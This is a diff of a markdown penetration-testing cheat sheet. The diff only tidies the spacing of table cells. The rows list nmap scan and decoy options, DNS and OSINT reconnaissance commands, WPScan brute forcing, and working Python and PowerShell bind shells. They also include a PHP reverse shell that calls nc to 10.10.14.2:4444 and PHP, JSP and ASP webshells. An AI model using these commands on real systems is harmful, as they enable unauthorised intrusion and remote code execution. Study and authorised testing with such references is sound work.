@@ -564,15 +564,15 @@ X-Forwarded-Host: IP
 | Description        | Command      |
 | ------ | ----- |
 | Disables port scanning | `` -sn `` |
-| Disables ICMP Echo Requests |`` -Pn ``|
+| Disables ICMP Echo Requests | `` -Pn `` |
 | Disables DNS Resolution.| `` -n `` |
-| Performs the ping scan by using ICMP Echo Requests against the target. |`` -PE `` |
+| Performs the ping scan by using ICMP Echo Requests against the target. | `` -PE `` |
 | Shows all packets sent and received | `` --packet-trace `` |
-| Displays the reason for a specific result | `` --reason ``|
+| Displays the reason for a specific result | `` --reason `` |
 | Disables ARP Ping Requests | `` --disable-arp-ping `` |
-| Scans the specified top ports that have been defined as most frequent | `` --top-ports=<num> ``|
+| Scans the specified top ports that have been defined as most frequent | `` --top-ports=<num> `` |
 | Scan all ports | `` -p- `` |
-| Scan all ports between 22 and 110 |`` -p22-110 `` |
+| Scan all ports between 22 and 110 | `` -p22-110 `` |
 | Scans only the specified ports 22 and 25 | `` -p22,25 `` |
 | Scans top 100 ports | `` -F `` |
 | Performs an TCP SYN-Scan | `` -sS `` |
@@ -582,7 +582,7 @@ X-Forwarded-Host: IP
 | Perform a Script Scan with scripts that are categorized as "default" | `` -sC `` |
 | Performs a Script Scan by using the specified scripts | `` --script <script> `` |
 | Performs an OS Detection Scan to determine the OS of the target | `` -O `` |
-| Performs OS Detection, Service Detection, and traceroute scans  |`` -A `` |
+| Performs OS Detection, Service Detection, and traceroute scans | `` -A `` |
 | Sets the number of random Decoys that will be used to scan the target | `` -D RND:5 `` |
 | Specifies the network interface that is used for the scan | `` -e `` |
 | Specifies the source IP address for the scan | `` -S 10.10.10.200	`` |
@@ -603,7 +603,7 @@ X-Forwarded-Host: IP
 | ------ | ----- |
 | Stores the results in all available formats starting with the name of "filename" | `` -oA filename `` |
 | Stores the results in normal format with the name "filename" | `` -oN filename `` |
-| Stores the results in "grepable" format with the name of "filename" | `` -oG filename	`` |
+| Stores the results in "grepable" format with the name of "filename" | `` -oG filename `` |
 | Stores the results in XML format with the name of "filename" | `` -oX filename `` |
 
 ### Nmap Performance Options
@@ -624,16 +624,16 @@ X-Forwarded-Host: IP
 | Identify the A record for the target domain | `` nslookup $TARGET `` |
 | Identify the A record for the target domain | ``nslookup -query=A $TARGET `` |
 | Identify the A record for the target domain | `` dig $TARGET @<nameserver/IP>	 `` |
-| Identify the A record for the target domain |``dig a $TARGET @<nameserver/IP> ``|
+| Identify the A record for the target domain | `` dig a $TARGET @<nameserver/IP> `` |
 | Identify the PTR record for the target IP address | `` nslookup -query=PTR <IP>	`` |
-| Identify the PTR record for the target IP address |``dig -x <IP> @<nameserver/IP>	``|
+| Identify the PTR record for the target IP address | `` dig -x <IP> @<nameserver/IP> `` |
 | Identify ANY records for the target domain | `` nslookup -query=ANY $TARGET `` |
-| Identify ANY records for the target domain |`` dig any $TARGET @<nameserver/IP> ``|
+| Identify ANY records for the target domain | `` dig any $TARGET @<nameserver/IP> `` |
 | Identify the TXT records for the target domain | `` nslookup -query=TXT $TARGET `` |
-| Identify the TXT records for the target domain |`` dig txt $TARGET @<nameserver/IP> ``|
+| Identify the TXT records for the target domain | `` dig txt $TARGET @<nameserver/IP> `` |
 | Identify the MX records for the target domain | `` nslookup -query=MX $TARGET `` |
-| Identify the MX records for the target domain |`` dig mx $TARGET @<nameserver/IP>	 ``|
-| Check the using of a specific DNS Server.|`` nslookup example.com ns1.nsexample.com ``|
+| Identify the MX records for the target domain | `` dig mx $TARGET @<nameserver/IP> `` |
+| Check the using of a specific DNS Server | `` nslookup example.com ns1.nsexample.com `` |
 | Identify the NS records for the target domain | `` dig ns $TARGET @<nameserver/IP> `` |
 | Identify the SOA record for the target domain | `` dig soa $TARGET @<nameserver/IP> `` |
 | Perform DNS zone transfer (AXFR) | `` dig axfr $TARGET @<nameserver/IP> `` |
@@ -661,16 +661,16 @@ X-Forwarded-Host: IP
 | Enumerate DNS information using dnsmap	 | `` dnsmap $TARGET -w /usr/share/wordlists/dnsmap.txt -r output.txt `` |
 | Perform reverse IP lookup using HackerTarget	 | `` curl -s "https://api.hackertarget.com/reverseiplookup/?q=$TARGET" `` |
 | Perform reverse IP lookup using ViewDNS | `` curl -s "https://api.viewdns.info/reverseip/?host=$TARGET&apikey=<API_KEY>&output=json" `` |
-| Enumerate HTTP headers using hping3	 | `` hping3 -S -p 80 $TARGET -c 1 -q; hping3 -R -p 80 $TARGET -c 1 -q ``  |
-| Enumerate HTTP headers using wget	 | `` wget --spider --server-response http://$TARGET ``  |
-| Query DNS records using dnsrecon with wildcard support	 | `` dnsrecon -d $TARGET -D /usr/share/wordlists/dnsrecon/subdomains-top1mil-20000.txt -t brt -a -o subdomains.txt ``  |
-| Check for DNS zone transfers using dnsrecon	 | `` dnsrecon -d $TARGET -t axfr -o zone-transfer.txt ``  |
-| Enumerate DNS information using dnsbrute	 | `` dnsbrute $TARGET --file /usr/share/wordlists/dnsmap.txt -o subdomains.txt ``  |
-| Perform email harvesting using Metagoofil	 | `` metagoofil -d $TARGET -t pdf,doc,xls,ppt,docx,pptx,xlsx -l 100 -n 50 -o metagoofil.txt -f metagoofil.html ``  |
-| Query GitHub for sensitive data using GitMiner | `` gitminer -q '$TARGET' --github-token <access_token> -o gitminer.txt ``  |
-| Search for subdomains on Certificate Transparency Logs using CT-Exposer | `` ct-exposer -d $TARGET -o subdomains.txt ``  |
-| Perform a SSL certificate transparency log search using certspotter  | `` certspotter -d $TARGET -o subdomains.txt ``  |
-| Extract SSL certificate information using openssl	 | `` echo | openssl s_client -showcerts -servername $TARGET -connect $TARGET:443 2>/dev/null | openssl x509 -inform pem -noout -text ``  |
+| Enumerate HTTP headers using hping3 | `` hping3 -S -p 80 $TARGET -c 1 -q; hping3 -R -p 80 $TARGET -c 1 -q `` |
+| Enumerate HTTP headers using wget | `` wget --spider --server-response http://$TARGET `` |
+| Query DNS records using dnsrecon with wildcard support | `` dnsrecon -d $TARGET -D /usr/share/wordlists/dnsrecon/subdomains-top1mil-20000.txt -t brt -a -o subdomains.txt `` |
+| Check for DNS zone transfers using dnsrecon | `` dnsrecon -d $TARGET -t axfr -o zone-transfer.txt `` |
+| Enumerate DNS information using dnsbrute | `` dnsbrute $TARGET --file /usr/share/wordlists/dnsmap.txt -o subdomains.txt `` |
+| Perform email harvesting using Metagoofil | `` metagoofil -d $TARGET -t pdf,doc,xls,ppt,docx,pptx,xlsx -l 100 -n 50 -o metagoofil.txt -f metagoofil.html `` |
+| Query GitHub for sensitive data using GitMiner | `` gitminer -q '$TARGET' --github-token <access_token> -o gitminer.txt `` |
+| Search for subdomains on Certificate Transparency Logs using CT-Exposer | `` ct-exposer -d $TARGET -o subdomains.txt `` |
+| Perform a SSL certificate transparency log search using certspotter | `` certspotter -d $TARGET -o subdomains.txt `` |
+| Extract SSL certificate information using openssl | `` echo | openssl s_client -showcerts -servername $TARGET -connect $TARGET:443 2>/dev/null | openssl x509 -inform pem -noout -text `` |
 | Search for API keys and secrets with TruffleHog | `` trufflehog git https://github.com/$TARGET/$REPO --regex --entropy=False `` |
 | Search for GitHub repositories | `` curl -s "https://api.github.com/search/repositories?q=$TARGET" | jq '.items[].full_name' `` |
 | Search for exposed S3 buckets | `` curl -s "http://$TARGET.s3.amazonaws.com/" `` |
@@ -689,9 +689,9 @@ X-Forwarded-Host: IP
 | Description        | Command      |
 | ------ | ----- |
 | Whatweb technology identification | `` whatweb -a https://www.example.com -v `` |
-| Display HTTP headers of the target webserver |``curl -I "http://${TARGET}" ``|
-| Aquatone: makes screenshots of all subdomains in the subdomain.list |``cat subdomain.list \| aquatone -out ./aquatone -screenshot-timeout 1000 ``|
-| WAF Fingerprinting |`` wafw00f -v https://$TARGET ``|
+| Display HTTP headers of the target webserver | `` curl -I "http://${TARGET}" `` |
+| Aquatone: makes screenshots of all subdomains in the subdomain.list | `` cat subdomain.list \| aquatone -out ./aquatone -screenshot-timeout 1000 `` |
+| WAF Fingerprinting | `` wafw00f -v https://$TARGET `` |
 | Enumerate HTTP methods | `` nmap -p80 --script http-methods $TARGET `` |
 | Nikto vulnerability scanner | `` nikto -h https://$TARGET -output nikto.txt `` |
 | Nmap web server vulnerability scan | `` nmap -p 80,443 --script http-vuln-* $TARGET `` |
@@ -806,13 +806,13 @@ X-Forwarded-Host: IP
 | Start a bind shell (python) | `` python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")' `` |
 | Start a bind shell (powershell) | `` powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(); `` |
 | Start a reverse shell from php | `` <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.14.2 4444 >/tmp/f"); ?> `` |
-| Add a reverse shell in php code | `` system($_GET['cmd']) ``; |
-| Connect to a bind shell started on the remote server | `` nc 10.10.10.1 1234	 `` |
+| Add a reverse shell in php code | `` system($_GET['cmd']) `` |
+| Connect to a bind shell started on the remote server | `` nc 10.10.10.1 1234 `` |
 | Python: Upgrade shell TTY | ``python -c 'import pty; pty.spawn("/bin/bash")' `` |
 | Upgrade shell TTY (2) | `` ctrl+z then stty raw -echo then fg then enter twice `` |
-| Start a webshell (php) | `` <?php system($_REQUEST["cmd"]); ?> ``  |
-| Start a webshell (jsp) | `` <% Runtime.getRuntime().exec(request.getParameter("cmd")); %> ``  |
-| Start a webshell (asp) | `` <% eval request("cmd") %> ``  |
+| Start a webshell (php) | `` <?php system($_REQUEST["cmd"]); ?> `` |
+| Start a webshell (jsp) | `` <% Runtime.getRuntime().exec(request.getParameter("cmd")); %> `` |
+| Start a webshell (asp) | `` <% eval request("cmd") %> `` |
 | Create a webshell php file | `` echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php `` |
 | Execute a command on an uploaded webshell | `` curl http://SERVER_IP:PORT/shell.php?cmd=COMMAND `` |
 | Start socat listener  | `` socat file:`tty`,raw,echo=0 tcp-listen:4444 `` |
@@ -911,7 +911,7 @@ X-Forwarded-Host: IP
 | XML-RPC: List all methods enabled| `` curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>user</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://example.com/xmlrpc.php \| grep "<value><string>"`` |
 | XML-RPC: Connect with credentials | `` curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>user</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://example.com/xmlrpc.php `` |
 | WPscan enumeration | `` wpscan --url http://example.com --enumerate --api-token TOKEN `` |
-| WPscan brute force login with XML-RPC |  `` wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://example.com ``|
+| WPscan brute force login with XML-RPC | `` wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://example.com `` |
 | Get reverse shell in malicious 404 | `` curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id" `` |
 
 ### Evasion & Bypass Techniques
